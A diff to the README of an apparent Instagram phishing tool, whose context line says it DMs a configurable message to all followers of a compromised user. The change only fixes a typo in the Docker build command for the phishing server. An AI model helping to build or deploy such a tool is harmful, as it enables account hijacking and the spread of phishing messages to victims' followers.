@@ -7,7 +7,7 @@ Once a user is compermised, this tool will DM a configurable message to all foll
 ## Installation
 #### With [Docker](https://www.docker.com/)
 ```bash
-dockerbuild -t instagram-phisher ./server
+docker build -t instagram-phisher ./server
 docker run -p 80:80 instagram-phisher
 ```
 #### Manual installation
